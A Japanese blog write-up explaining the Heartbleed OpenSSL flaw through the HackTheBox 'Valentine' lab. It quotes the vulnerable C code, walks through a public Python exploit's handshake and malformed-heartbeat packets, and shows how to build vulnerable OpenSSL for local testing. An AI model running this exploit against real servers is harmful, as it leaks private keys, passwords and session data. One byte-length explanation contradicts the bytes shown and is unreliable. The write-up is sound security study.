---
title: HackTheBox「Valentine」で学ぶ Heartbleed 脆弱性
date: "2021-10-04"
template: "post"
draft: false
slug: "hackthebox-linux-valentine"
category: "HackTheBox"
tags:
  - "HackTheBox"
  - "Linux"
  - "EasyBox"
description: "HackTheBoxのRetired Machine [valentine] を通して、Heartbleed 脆弱性について学びます。"
socialImage: "/media/cards/no-image.png"
---

趣味で「Hack The Box」という、ペネトレーションテストの学習プラットフォームを利用してセキュリティについて学んでいます。
「Hack The Box」のランクは、本記事執筆時点でProHackerです。

<img src="http://www.hackthebox.eu/badge/image/327080" alt="Hack The Box">

この記事では、HackTheBoxのマシン攻略を通して「Heartbleed(CVE-2014-0160)」に対する攻撃と、セキュリティ向上のための対処方法について勉強したことをまとめていきます。

今回攻略するマシン「Valentine」は、僕がHackTheBoxで初めて攻略したマシンです。
当時は何もわからない状態でWriteUpを見ながら解いたのですが、「Heartbleed(CVE-2014-0160)」の悪用について全く理解しないまま進めてしまったのがずっと心残りでした。

そのため、今回は「Heartbleed(CVE-2014-0160)」の悪用についてちゃんと理解したいと思い、この記事を書きました。

<!-- omit in toc -->
## 本記事について

**本記事の内容は社会秩序に反する行為を推奨することを目的としたものではございません。**

自身の所有する環境、もしくは許可された環境以外への攻撃の試行は、「不正アクセス行為の禁止等に関する法律（不正アクセス禁止法）」に違反する可能性があること、予めご留意ください。

またすべての発言は所属団体ではなく個人に帰属します。

<!-- omit in toc -->
## もくじ
- [Heartbleed(CVE-2014-0160) とは](#heartbleedcve-2014-0160-とは)
	- [日本国内でも多くの攻撃を観測](#日本国内でも多くの攻撃を観測)
	- [Heartbleedのメカニズム](#heartbleedのメカニズム)
- [OpenSSLの問題のコードを読んでみる](#opensslの問題のコードを読んでみる)
	- [1. 受け取ったデータの先頭1バイトをhbtypeとして取得](#1-受け取ったデータの先頭1バイトをhbtypeとして取得)
	- [2. 受け取ったデータの先頭2バイト目から3バイト目をpayload(ペイロード長)として取得](#2-受け取ったデータの先頭2バイト目から3バイト目をpayloadペイロード長として取得)
- [HackTheBox [Valentine] を攻略する](#hackthebox-valentine-を攻略する)
- [Heartbleed の攻撃コードを読む](#heartbleed-の攻撃コードを読む)
	- [main関数](#main関数)
		- [1．引数の受け取り](#1引数の受け取り)
		- [2．各バージョンごとにコネクションを確立し、create_hello関数を実行](#2各バージョンごとにコネクションを確立しcreate_hello関数を実行)
		- [3．なんやかんや応答チェック](#3なんやかんや応答チェック)
		- [4. exploitの送信](#4-exploitの送信)
	- [create_hello関数](#create_hello関数)
	- [recvmsg関数](#recvmsg関数)
	- [create_hb関数](#create_hb関数)
- [おまけ：脆弱なOpenSSLをビルドする](#おまけ脆弱なopensslをビルドする)
- [おまけ：Heartbeatリクエストとレスポンスを確認する](#おまけheartbeatリクエストとレスポンスを確認する)
- [まとめ](#まとめ)
- [参考情報](#参考情報)
	- [BOOK](#book)
	- [WEB](#web)

### 本記事のテーマ

今回のテーマは、「Heartbleed(CVE-2014-0160)」の再現を通して、脆弱性の詳細について学ぶことです。
そのため、純粋なWriteUpではないこと、ご了承ください。

## Heartbleed(CVE-2014-0160) とは

「Heartbleed」とは、2014年に発覚し、猛威を振るったOpenSSLの脆弱性の名称です。
当時、脆弱性のあるバージョンのOpenSSLがかなり普及していたこともあり、世界中で実際に多くの被害を出したことで知られています。

> ハートブリード（英語: Heartbleed）とは、2014年4月に発覚したオープンソース暗号ライブラリ「OpenSSL」のソフトウェア・バグのことである。当時、信頼された認証局から証明書が発行されているインターネット上のWebサーバの約17％（約50万台）で、この脆弱性が存在するHeartbeat拡張が有効になっており、サーバーの秘密鍵や利用者のセッション・クッキーやパスワードを盗み出すことが出来る可能性があった。
>
> [ハートブリード - Wikipedia](https://ja.wikipedia.org/wiki/%E3%83%8F%E3%83%BC%E3%83%88%E3%83%96%E3%83%AA%E3%83%BC%E3%83%89)

### 日本国内でも多くの攻撃を観測

- [三菱UFJニコスも被害を公表　Heartbleedで致命傷を負わないために ｜ビジネス+IT](https://www.sbbit.jp/article/cont1/27881)
- [Heartbleed攻撃は脆弱性公開から1週間で100万件超--日本IBM「2014年上半期 Tokyo SOC情報分析レポート」 (1/2)：EnterpriseZine（エンタープライズジン）](https://enterprisezine.jp/iti/detail/6110)

### Heartbleedのメカニズム

さて、実際に攻撃を実践するためには、Heartbleedの脆弱性がどのように悪用されるのかを知る必要があります。

**Heartbleedは、OpenSSL1.0.1から実装された「heartbeat」という、通信相手が稼働しているかを確認するための機能のバグを悪用する脆弱性です。**

「heartbeat」機能では、SSL通信の疎通確認のため、上限64KBの確認データを送信します。
確認用データを受信した側は、そのデータをそのまま応答に使用し、確認用データを送信した側が応答を受信することで稼働確認を行います。

この際問題となるのが、**データを受信した側は確認データのサイズ上限の確認を行わない**ことです。

このバグによって、**実際に送信しているペイロード長よりも大きな値を設定して送信するとバッファ上のペイロードがないメモリ領域まで読み込んでheartbeatレスポンスで応答する問題**が発生します。

これを利用することで、サーバ上の情報が意図しない形で抜き出されてしまいます。
この脆弱性の怖い点としては、サーバ上の情報（秘密鍵含む）が流出する可能性があるのはもちろんですが、情報漏洩の痕跡が残りにくいことでしょうか。

ユーザとしては、情報漏洩があったと仮定してパスワードなどの変更くらいしか対処法がなさそうです。

## OpenSSLの問題のコードを読んでみる

[OpenSSL の脆弱性対策について(CVE-2014-0160)：IPA 独立行政法人 情報処理推進機構](https://www.ipa.go.jp/security/ciadr/vul/20140408-openssl.html)によると、以下のバージョンのOpenSSLがこの脆弱性の影響を受けるようです。

- OpenSSL 1.0.1 から 1.0.1f
- OpenSSL 1.0.2-beta から 1.0.2-beta1

そのため、[openssl/openssl: TLS/SSL and crypto library](https://github.com/openssl/openssl)から、問題のあるコードを読んでみることにしました。

OpenSSLのリポジトリをcloneした後、`git checkout refs/tags/OpenSSL_1_0_1f`をたたくと、問題のブランチに移動できます。

取得した古いソースコードから、`heartbeat`という文字列で検索をかけたところ、問題のある関数が見つかりました。

では、ここからこの問題コードを読んでいきます。

```c
# t1_lib.c

#ifndef OPENSSL_NO_HEARTBEATS
int tls1_process_heartbeat(SSL *s)
{
	unsigned char *p = &s->s3->rrec.data[0], *pl;
	unsigned short hbtype;
	unsigned int payload;
	unsigned int padding = 16; /* Use minimum padding */

	/* Read type and payload length first */
    // 1. 受け取ったデータの先頭1バイトをhbtypeとして取得
	hbtype = *p++;
    
    // 2. 受け取ったデータの先頭2バイト目から3バイト目をpayload(ペイロード長)として取得
	n2s(p, payload);
	pl = p;
・・・
    if (hbtype == TLS1_HB_REQUEST)
	{
        ・・・
		buffer = OPENSSL_malloc(1 + 2 + payload + padding);
		bp = buffer;
		
		/* Enter response type, length and copy payload */
		*bp++ = TLS1_HB_RESPONSE;
		s2n(payload, bp);
        
        // 3. memcpy 想定しないアドレスの情報まで抜き出してしまう
		memcpy(bp, pl, payload);
		bp += payload;

・・・
```

読みやすいように、コメントをつけておきました。

まずは次の項目からです。

### 1. 受け取ったデータの先頭1バイトをhbtypeとして取得

heartbeatとして送られてきた**データの先頭1バイト目には、そのデータが要求なのか、応答なのかを示す数値が格納されている**ようで、これを取得しています。
具体的には、ssl_3.hにて定義されていました。

```c
; ssl_3.h
#define TLS1_HB_REQUEST		1
#define TLS1_HB_RESPONSE	2
```

### 2. 受け取ったデータの先頭2バイト目から3バイト目をpayload(ペイロード長)として取得

次に、受け取ったデータの2バイト目から3バイト目を`n2s()`マクロで取得し、payloadに格納しています。

```c
#define n2s(c,s)	( ( s = (((unsigned int)(c[0]))<< 8) | (((unsigned int)(c[1]))) ) , c+=2)
```

なぜこのようなことをしているのか疑問だったのですが、**受け取ったデータの2バイト目から3バイト目には、payload全体のlengthが格納されている**ようです。
参考：[Heartbleed Bug Explained](https://stackabuse.com/heartbleed-bug-explained/)

つまり、ここで取得したpayload長に対するバリデーションが存在しないままmemcpy関数にpayload長を与えてしまうことで、本来想定されていない領域の情報まで応答に含んでしまうようになるというわけです。
参考：[ARR33-C. コピーは必ず十分なサイズの記憶領域に対して行われることを保証する](https://www.jpcert.or.jp/sc-rules/c-arr33-c.html)

これで、脆弱性のメカニズムの概要はつかめたような気がしますが、最後に疑問が残ります。
**なぜ、Heartbleedの悪用で一度に得られる情報の最大値が64KBと言われているのでしょうか。**

これは、ペイロード長として使用される枠が2バイトであるためです。
ペイロード長を示すバイト列には、16進数で最大FFFFまでの値を挿入できます。

2バイト=16bitで表現できるアドレスは64KBまでなので、**Heartbleedの悪用で一度に取得できる情報の最大値も64KB**という話です。

## HackTheBox [Valentine] を攻略する

さて、Heartbleedの概要がつかめたところで、実際にこの脆弱性を悪用して、HackTheBox のEasyマシン、Valentineを攻略していきます。

とはいえ、今回のテーマはHeartbleedに対する攻撃を再現することですので、攻略手法の大部分は割愛します。
マシン攻略の詳細は、[yukitsukai47](https://qiita.com/yukitsukai47)さんの[Hack The Box[Valentine] -Writeup- - Qiita](https://qiita.com/yukitsukai47/items/e59407abd1e76fa48a24)が分かりやすいのでおすすめです。

## Heartbleed の攻撃コードを読む

公開されている攻撃コードを参考に、実際の悪用方法について理解していきたいと思います。

攻撃コードは[exploit-db.com/exploits/32764](https://www.exploit-db.com/exploits/32764)を参考にしました。

コードの全体は貼りませんので、適宜上記のページを参照ください。

### main関数

まずはmain関数部分を読んで、攻撃の流れを把握してみようと思います。

```python
def main():
    # 1. 引数の受け取り
	opts, args = options.parse_args()
	if len(args) < 1:
		options.print_help()
		return
    
    # 2. 各バージョンごとにコネクションを確立し、create_hello関数を実行
	for i in range(len(version)):
		print 'Trying ' + version[i][0] + '...'
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		print 'Connecting...'
		sys.stdout.flush()
		s.connect((args[0], opts.port))
		print 'Sending Client Hello...'
		sys.stdout.flush()
		s.send(create_hello(version[i][1]))
		print 'Waiting for Server Hello...'
		sys.stdout.flush()
        
        # 3．なんやかんや応答チェック
		while True:
			typ, ver, pay = recvmsg(s)
			if typ == None:
				print 'Server closed connection without sending Server Hello.'
				return
			# Look for server hello done message.
			if typ == 22 and ord(pay[0]) == 0x0E:
				break
                
		# 4. exploitの送信
		print 'Sending heartbeat request...'
		sys.stdout.flush()
		s.send(create_hb(version[i][1]))
		if hit_hb(s,create_hb(version[i][1])):
			#Stop if vulnerable
			break

if __name__ == '__main__':
	main()
```

#### 1．引数の受け取り

引数なしの実行はできないようです。
引数には、攻撃先のIPを指定する必要があります。

#### 2．各バージョンごとにコネクションを確立し、create_hello関数を実行

あらかじめ定義されているバージョンリストのそれぞれで`create_hello(version)`を実行しているようです。
`create_hello(version)`については[後述](#create_hello関数)します。

#### 3．なんやかんや応答チェック

`recvmsg(s)` の中のそれぞれの値が、`typ == 22 and ord(pay[0]) == 0x0E`であればServerHelloを受信したものとして、ペイロードの送信に進みます。

`recvmsg(s)` についても[後述](#recvmsg関数)します。

#### 4. exploitの送信

コネクションが確認できたら、`create_hb(version[i][1])`で攻撃パケットを送り込み、応答パケットの情報を表示します。

`create_hb(version[i][1])`についても[後述](#create_hb関数)します。

### create_hello関数

では、各関数の処理を見てみます。

最初はcreate_hello関数です。

```python
def h2bin(x):
	return x.replace(' ', '').replace('\n', '').decode('hex')

def create_hello(version):
	hello = h2bin('16 ' + version + ' 00 dc 01 00 00 d8 ' + version + ''' 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01
''')
	return hello
```

最終的に戻り値`hello`として返しているのは、以下のバイトコードをdecodeしたものでした。

```
16 03 00 00 dc 01 00 00 d8 03 00 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01
```

これは、ClientHelloに使用するパケットデータを生成しています。
ClientHelloは、新規のハンドシェイク時に必ず最初に送信されるデータです。

そもそも、**SSLのデータ（レコード）は、5バイトのレコードヘッダとそれに続くデータ**で構成されます。
参考：[SSL Introduction with Sample Transaction and Packet Exchange - Cisco](https://www.cisco.com/c/en/us/support/docs/security-vpn/secure-socket-layer-ssl/116181-technote-product-00.html)

上記のデータでは、`16 03 00 00 dc`がレコードヘッダです。
先頭の0x16は、`Type`が`Handshake (22, 0x16)`であることを示します。

次に、`version`として挿入している2バイトは、`Record Version`を指します。
`03 00`が指定されているので、`SSL Version 3 (SSLv3)`と解釈されます。

そして最後の2バイトが`Length`で、レコードのサイズを指定しています。

データ部に関しては、ClientHelloが送信する次のような情報が含まれているはずです。

1. Version：クライアントがサポートする最良のバージョンです
2. Random：32バイトで構成され、4バイトに時刻、28バイトにランダムに生成されたデータが保存されます
3. SessionID：ClientHelloの場合は、SessionIDは空です
4. Chiper Suites：クライアントが対応可能な暗号スイートが格納されます
5. Conpression Methods：クライアントが対応している圧縮方法が指定されます
6. Extentions：付加的なデータのための拡張が指定されます

### recvmsg関数

生成したClientHelloを送り付けたので、ServerHelloが返却されてきます。

`recvmsg(s)`は、この情報を取得しています。
この関数によって、次のような情報が表示されました。

```
Waiting for Server Hello...
 ... received message: type = 22, ver = 0301, length = 66
 ... received message: type = 22, ver = 0301, length = 885
 ... received message: type = 22, ver = 0301, length = 331
 ... received message: type = 22, ver = 0301, length = 4
```

ServerHelloの構造は、ClientHelloと同じです。
レコードヘッダ部から、ハンドシェイクのTypeとSSLのバージョン、データ長を取得しています。

しかし、ServerHelloの構造は、ClientHelloと同じですが、そのデータ部には、サーバ側で決定された情報が追加されます。（SessionIDなど）

なお、ClientHelloでは、SSLのバージョンについて`03 00`を指定して送信していましたが、ServerHelloでは`03 01`が返ってきています。

これは、**サーバ側は必ずしもクライアントと同じバージョンに対応している必要はない**ためです。
サーバ側は、クライアント側が自信のバージョンに対応してくれることを期待し、応答を返します。

これでコネクションが確立できることが分かったのですが、今回はSSLハンドシェイクを構築する必要はないので、データ部の中にServerHelloの完了を示す情報が確認されたタイミングでbreakしていますね。

```python
# Look for server hello done message.
	if typ == 22 and ord(pay[0]) == 0x0E:
		break
```

SSL接続が可能なことが確認されたため、最後はいよいよ攻撃性のハートビートパケットを送信してデータを抜き出します。

### create_hb関数

最後は攻撃パケットを送信する部分です。
応答を確認しているhit_hb関数も一緒に見ていきます。

```python
def create_hb(version):
	hb = h2bin('18 ' + version + ' 00 03 01 40 00')
	return hb

def hit_hb(s,hb):
	s.send(hb)
	while True:
		typ, ver, pay = recvmsg(s)
		if typ is None:
			print 'No heartbeat response received, server likely not vulnerable'
			return False

		if typ == 24:
			print 'Received heartbeat response:'
			hexdump(pay)
			if len(pay) > 3:
				print 'WARNING: server returned more data than it should - server is vulnerable!'
			else:
				print 'Server processed malformed heartbeat, but did not return any extra data.'
			return True

		if typ == 21:
			print 'Received alert:'
			hexdump(pay)
			print 'Server returned error, likely not vulnerable'
			return False
        
def main():
    ・・・
		print 'Sending heartbeat request...'
		sys.stdout.flush()
		s.send(create_hb(version[i][1]))
		if hit_hb(s,create_hb(version[i][1])):
			#Stop if vulnerable
			break
```

`s.send(create_hb(version[i][1]))`では、生成したハートビートのバイト列を送り付けてますね。

送り付けているのは、`18 03 00 00 03 01 40 00`というバイト列です。
内容としては、先のレコードヘッダとほぼ同じ構造です。

先頭の`18`がheartbeat拡張であることを示し、`03 00`がSSL 3.0プロトコルを使用することを伝えます。

`00 03`は、以降のデータペイロードが3バイトであることを意味します。
最後の`01 40 00`は、[OpenSSLの問題のコードを読んでみる](#OpenSSLの問題のコードを読んでみる)で説明した、HeartbeatのTypeとペイロード長です。

先頭の1バイトが`01`なので、ハートビート要求パケットとなります。
また、後半2バイトが`04 00`なので、サーバ側はこのハートビート要求が1KBであると誤認します。

そして、応答を受け取るhit_hb関数ですが、これは特別なことはしていません。
応答パケットのレコードヘッダから、正常にハートビート応答が返ってきたことが確認された場合にのみ、パケットをhexdump形式で出力しています。

これで、Heartbleedの悪用によって、サーバ側の情報を抜き出すことに成功し、マシンの認証情報を抜き出すことができました！

## おまけ：脆弱なOpenSSLをビルドする

ValentineはRetiredマシンなので、プレイするにはHackTheBoxの有料会員（月額1000円くらい）に登録する必要があります。

ここでは、有料会員には登録したくないけどHeartbleedの検証は自分でやってみたいという方向けに、脆弱性のあるバージョンのOpenSSLを取得する方法についてまとめます。

脆弱なバージョンのOpenSSLを取得するためには、古いバージョンのOSやDockerイメージを利用する方法や、古いバージョンのOpenSSLを直接ビルドする方法などがあると思います。

今回は、古いバージョンのOpenSSLを直接ビルドする方法について紹介します。

大まか流れとしては以下の通りです。

1. 安全な環境を用意する（僕は適当なDockerコンテナを使いました）
2. OpenSSLのリポジトリをcloneしてくる
3. OpenSSL_1_0_1fのタグでブランチを切る
4. ビルドする

とりあえず、適当に構築したDockerコンテナのtmpディレクトリにOpenSSLのリポジトリをcloneして、脆弱なバージョンのブランチに切り替えておきます。

```bash
git clone https://github.com/openssl/openssl
cd openssl
git checkout -b tag refs/tags/OpenSSL_1_0_1f
```

次にOpenSSLをビルドします。
この際、僕の環境ではmanページのインストールに問題があったため、`make install_sw`でmanページのインストールを省略しました。

```bash
./config --openssldir=/tmp
make
make install_sw
```

ビルドが完了すると、appディレクトリにプログラムが配置されます。
バージョンを確認すると、`OpenSSL 1.0.1f`が想定通りビルドされていることがわかります。

```bash
root@3d6a898953b4:/tmp/openssl/apps# ./openssl version
OpenSSL 1.0.1f 6 Jan 2014
```

これで、ローカルな環境でもHeartbleedのテストができるようになります。

また、環境によっては、`error while loading shared libraries: libssl.so.3`というエラーでうまく実行できないかもしれません。

その場合は、次のコマンドで解消します。

```bash
ln -s libssl.so.3 libssl.so
ldconfig
```

## おまけ：Heartbeatリクエストとレスポンスを確認する

Heartbeat機能が存在する古いOpenSSLの`-tlsextdebug`を使用することで、被攻撃サーバがHeartbleedの脆弱性を持っているか確認することができます。

以下は、そのコマンドと出力例です。
`TLS server extension "heartbeat" (id=15), len=1`の行から、heartbeat拡張が稼働していることが分かります。

```bash
./openssl s_client -connect 10.10.10.79:443 -tlsextdebug

CONNECTED(00000003)
TLS server extension "renegotiation info" (id=65281), len=1
0001 - <SPACES/NULS>
TLS server extension "EC point formats" (id=11), len=4
0000 - 03 00 01 02                                       ....
TLS server extension "session ticket" (id=35), len=0
TLS server extension "heartbeat" (id=15), len=1
0000 - 01                                                .
depth=0 C = US, ST = FL, O = valentine.htb, CN = valentine.htb
verify error:num=18:self signed certificate
verify return:1
depth=0 C = US, ST = FL, O = valentine.htb, CN = valentine.htb
verify error:num=10:certificate has expired
notAfter=Feb  6 00:45:25 2019 GMT
verify return:1
depth=0 C = US, ST = FL, O = valentine.htb, CN = valentine.htb
notAfter=Feb  6 00:45:25 2019 GMT
verify return:1
---
```

また、`-msg`を付加することで、OpenSSLからHeartbleed要求を送信し、レスポンスを確認することができます 。

```bash
./openssl s_client -connect 10.10.10.79:443 -tlsextdebug -msg

---
B
HEARTBEATING
>>> TLS 1.2  [length 0025], HeartbeatRequest
    01 00 12 00 00 87 59 cd ed cf e6 27 84 05 2c 2c
    47 5a 51 7f d9 e5 51 a8 47 f7 01 24 35 54 f1 3d
    b6 25 bf 64 cb
<<< TLS 1.2  [length 0025], HeartbeatResponse
    02 00 12 00 00 87 59 cd ed cf e6 27 84 05 2c 2c
    47 5a 51 7f d9 67 e6 79 58 b7 b9 46 f0 82 b6 76
    a5 cb 75 d1 1a
read R BLOCK
```

上記のように、`01`で始まる`00 12`バイトのデータを送信し、サーバから`02`で始まる、全く同じデータを持つハートビート応答を受け取っていることがわかります 。

## まとめ

HackTheBoxで初めて解いたマシン、Valentineより、Heartbleedの脆弱性について深堀してみました。

何も理解できないまま、何となく既存のエクスプロイトコードを実行して解いてしまったのがずっと心残りだったので、今回学びなおすことができてよかったです。

OpenSSLのソースコードを初めて読んだり、SSLコネクションの詳細について腰を据えて学びなおすことができたので非常に勉強になりました。

今後もテーマを決めて解説記事を書くようなことは続けていけたらと思います。

## 参考情報

### BOOK

- [プロフェッショナルSSL/TLS](https://amzn.to/3fGQ9h0)
- [マスタリングTCP/IP　入門編（第6版）](https://amzn.to/3du5b7h)

### WEB

- [図解でわかるHeartBleed | 日経クロステック（xTECH）](https://xtech.nikkei.com/it/atcl/column/16/041400084/041400003/)
- [OpenSSLのHeartbleed脆弱性(CVE-2014-0160)](https://www.tiger1997.jp/report/activity/securityreport_20140410.html)
- [OpenSSL TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure - Multiple remote Exploit](https://www.exploit-db.com/exploits/32745)
- [更新：OpenSSL の脆弱性対策について(CVE-2014-0160)：IPA 独立行政法人 情報処理推進機構](https://www.ipa.go.jp/security/ciadr/vul/20140408-openssl.html)
- [openssl/openssl: TLS/SSL and crypto library](https://github.com/openssl/openssl)
- [Hack The Box[Valentine] -Writeup- - Qiita](https://qiita.com/yukitsukai47/items/e59407abd1e76fa48a24)
- [Heartbleed Bug Explained](https://stackabuse.com/heartbleed-bug-explained/)
- [ARR33-C. コピーは必ず十分なサイズの記憶領域に対して行われることを保証する](https://www.jpcert.or.jp/sc-rules/c-arr33-c.html)
- [size_tは環境によって定義が変わるという話 - おおたの物置](https://ota42y.com/blog/2014/11/08/size-t/)
- [OpenSSL 1.0.1f TLS Heartbeat Extension - 'Heartbleed' Memory Disclosure (Multiple SSL/TLS Versions) - Multiple remote Exploit](https://www.exploit-db.com/exploits/32764)
- [SSL Introduction with Sample Transaction and Packet Exchange - Cisco](https://www.cisco.com/c/en/us/support/docs/security-vpn/secure-socket-layer-ssl/116181-technote-product-00.html)
- [SSL/TLS（SSL3.0～TLS1.2）のハンドシェイクを復習する - Qiita](https://qiita.com/n-i-e/items/41673fd16d7bd1189a29)
- [OpenSSL をソースからビルドする - Qiita](https://qiita.com/silverskyvicto/items/dca3d4b985829b4b5f1f)
- [On memory allocations larger than 64KB on 16-bit Windows | The Old New Thing](https://devblogs.microsoft.com/oldnewthing/20171113-00/?p=97386)